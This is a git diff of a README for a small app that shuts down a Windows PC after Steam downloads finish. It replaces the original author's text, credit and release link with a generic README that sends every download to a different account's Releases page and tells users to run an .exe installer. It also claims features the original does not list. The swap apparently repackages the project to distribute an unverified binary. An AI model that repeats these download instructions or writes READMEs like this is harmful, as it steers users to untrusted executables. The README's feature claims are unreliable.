@@ -1,56 +1,78 @@
-# Steam Auto Shutdown (Beta)
+# 🖥️ AutoShutdown-for-Downloads - Automatically Shut Down After Downloads
 
-A simple app that automatically shuts down your PC once Steam finishes downloading.  
-Perfect for overnight downloads — so you don’t have to worry about leaving your PC on all night.  
-It includes a 10-second countdown with a cancel button, so you always stay in control.
+[![Download AutoShutdown-for-Downloads](https://img.shields.io/badge/Download-AutoShutdown--for--Downloads-blue.svg)](https://github.com/TNTRoyality/AutoShutdown-for-Downloads/releases)
 
----
+## 🏁 Overview
 
-## Features
+AutoShutdown-for-Downloads monitors your Steam downloads and automatically shuts down your PC when they finish. This app features a countdown with a cancel option, so you can set your PC to turn off without worries, perfect for overnight downloads.
 
-- Detects when your Steam download folder is empty  
-- 10-second shutdown countdown with an easy cancel option  
-- Lightweight and clean GUI built with Tkinter  
-- Open source and easy to customize
+## 🚀 Getting Started
 
-![App image](./images/app1.png)
+This guide helps you download and run AutoShutdown-for-Downloads on your Windows computer. Follow these simple steps to get started.
 
-![App image](./images/app2.png)
+## 📥 Download & Install
 
----
+1. Click the download button below to visit the Releases page.
+   
+   [Download AutoShutdown-for-Downloads](https://github.com/TNTRoyality/AutoShutdown-for-Downloads/releases)
 
-## How to use
+2. On the Releases page, look for the latest release at the top. You’ll find a file named something like `AutoShutdown-for-Downloads-v1.0.exe`.
 
-1. Download and run the [`auto-shutdown.exe`](https://github.com/wilidretsi/AutoShutdown-for-Downloads/releases/tag/v1.0.0) from the Releases (no need to install Python).  
-2. The app monitors your Steam downloads folder quietly in the background.  
-3. When downloads finish, a countdown starts and your PC will shut down — unless you cancel it.
+3. Click on the file name to start the download.
 
----
+4. Once the download is complete, locate the file in your Downloads folder (or wherever you saved it).
 
-## Beta Notice
+5. Double-click the `.exe` file to run the installer. Follow the on-screen instructions to complete the installation.
 
-Heads up! This is a beta version, so some bugs might pop up.
+## 🔧 System Requirements
 
----
+To run AutoShutdown-for-Downloads, ensure your system meets the following requirements:
 
-## Want to help?
+- Windows 10 or later
+- At least 4 GB of RAM
+- A stable internet connection for Steam downloads
 
-Found a bug or have ideas to improve it? Open an issue or a pull request here on GitHub — every bit of feedback helps!
+## ⏱️ Using AutoShutdown-for-Downloads
 
----
+After installation, follow these steps to use the app:
 
-## License
+1. Launch AutoShutdown-for-Downloads from your Start menu or desktop shortcut.
 
-MIT License — see the [LICENSE](LICENSE) file for details.
+2. The app will automatically detect your current Steam downloads. You will see a list of ongoing downloads in the main window.
 
----
+3. Set a timer if you want to specify when the computer should shut down after all downloads finish. 
 
-# Changelog
+4. Click on "Start Countdown" to initiate the shutdown process once downloads are done.
 
-## v1.0.0 - 2025-07-22
-- Initial beta release with shutdown on Steam download finish.
-- Countdown and cancel button.
+5. If you change your mind, click "Cancel" to stop the countdown.
 
----
+## 🛠️ Features
 
-Made with ❤️ by wilidretsi
+- **Automatic Monitoring**: The app checks for ongoing Steam downloads without manual input.
+- **Easy Shutdown**: Automatically shuts down your PC when downloads finish.
+- **Countdown Timer**: Set a timer and enjoy flexibility.
+- **User-Friendly Interface**: Designed for easy navigation, even for beginners.
+
+## 🤔 Troubleshooting
+
+If you encounter issues while using the app, consider the following solutions:
+
+- **App Does Not Launch**: Ensure your Windows version is compatible and try re-installing the app.
+- **Download Not Detected**: Check that Steam is running and that there are active downloads.
+- **Shutdown Not Happening**: Make sure the countdown timer was set and confirm the settings in the app.
+
+## 📝 Contributions
+
+Contributions are welcome! If you have ideas or features to suggest, feel free to create an issue on this repository or submit a pull request. Please ensure that your contributions adhere to our guidelines for clarity and usability.
+
+## 📄 License
+
+This project is licensed under the MIT License. Feel free to use the code but remember to maintain acknowledgment of the original source.
+
+## 🔗 Further Resources
+
+For more information, visit the official repository:
+
+[GitHub Repository](https://github.com/TNTRoyality/AutoShutdown-for-Downloads)
+
+If you need assistance, consider reaching out in the repository's issue section. Enjoy hassle-free downloads with AutoShutdown-for-Downloads!
